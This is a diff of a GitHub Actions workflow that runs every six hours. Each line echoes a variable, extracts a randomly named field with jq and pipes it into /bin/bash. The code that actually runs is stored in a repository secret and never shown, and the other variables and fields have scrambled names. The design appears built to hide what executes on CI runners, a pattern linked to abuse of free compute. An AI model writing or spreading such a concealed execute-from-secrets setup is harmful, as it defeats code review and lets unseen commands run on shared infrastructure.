@@ -3,28 +3,26 @@ name: yezhenxnis
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 4/6 * * *'
-jobs:  # 1078
+    - cron: '30 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yezhenxnis
         env:
-          g102: ${{ secrets.g102 }}
+          cha7: ${{ secrets.cha7 }}
         run: |
-          echo $g102 | jq -r .dkk4878 | /bin/bash
-          echo $jnjfx9 | jq -r .mwz607 | /bin/bash
-          echo $ylq32725 | jq -r .yxn90658 | /bin/bash
-          echo $ntv117 | jq -r .oro2891 | /bin/bash
-          echo $jt39 | jq -r .i3925 | /bin/bash
-          echo $xim10 | jq -r .semso96953 | /bin/bash
-          echo $rgzi607 | jq -r .fcl375 | /bin/bash
-          echo $dku4992 | jq -r .qelbr17 | /bin/bash
-          echo $jvx23385 | jq -r .l2827 | /bin/bash
-          echo $aniq17016 | jq -r .ykgu3352 | /bin/bash
-          echo $k64 | jq -r .nwzs803 | /bin/bash
-          echo $icbnk0 | jq -r .ngb43 | /bin/bash
-          echo $koa7150 | jq -r .hme625 | /bin/bash
-          echo $igyx5247 | jq -r .v10666 | /bin/bash
+          echo $cha7 | jq -r .xxkj2280 | /bin/bash
+          echo $pru33144 | jq -r .rtvj62 | /bin/bash
+          echo $r14 | jq -r .tiyhr929 | /bin/bash
+          echo $wrxq1169 | jq -r .rsu0 | /bin/bash
+          echo $n86 | jq -r .cet2728 | /bin/bash
+          echo $efve4 | jq -r .hddq6263 | /bin/bash
+          echo $nibpb24262 | jq -r .bnjl2 | /bin/bash
+          echo $yrzu355 | jq -r .v0 | /bin/bash
+          echo $prst4027 | jq -r .fn646 | /bin/bash
+          echo $hzobl1 | jq -r .tot166 | /bin/bash
+          echo $bj07 | jq -r .g42139 | /bin/bash
 
